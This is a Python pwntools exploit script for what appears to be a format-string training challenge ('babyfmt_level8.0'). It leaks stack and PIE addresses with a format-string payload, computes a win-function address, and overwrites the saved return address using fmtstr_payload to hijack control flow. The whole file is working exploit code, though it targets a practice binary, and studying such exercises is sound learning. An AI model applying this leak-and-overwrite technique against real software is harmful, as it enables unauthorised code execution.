#!/usr/bin/env python3

from pwn import *

exe = ELF("./babyfmt_level8.0")

context.binary = exe


gdb_script = """
b *func+492
b *func+532
c
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,gdb_script)
    else:
        r = remote("addr", 1337)

    return r



win_off = 0x14 # - 
pie_off = 0xedb # +
stack_off = 0x1e8e9 # -
rbp_off = 0x1ecc0 # +
fmt_payload = b"%7$p-%31$p"
ret_off = 0x3df # +
input_off = 77

def main():
    r = conn()
    r.recvuntil(b"triggering the vulnerability:\n")

    r.send(fmt_payload)
    
    r.recvuntil(b"Your input is:                                                          \n").decode().strip()
    data = r.recvline().decode()
    log.info(f"Data: {data}")
    
    leaked_addrs = data.split('-')
    stack_leak = int(leaked_addrs[0], 16)
    pie_leak = int(leaked_addrs[1], 16)
    log.success(f"stack leak: {hex(stack_leak)}")
    log.success(f"pie Leak: {hex(pie_leak)}")
    win_addr = pie_leak + pie_off + win_off 
    ret_add = stack_leak + ret_off
    log.success(f"win addr: {hex(win_addr)}")
    log.success(f"ret addr: {hex(ret_add)}")
    offset = 78
    payload = b'A' * 7
    payload += fmtstr_payload(offset, {ret_add: win_addr}, write_size='short', numbwritten=80)
    log.info(f"Payload: {payload}")
    r.send(payload)
    r.interactive()


if __name__ == "__main__":
    main()
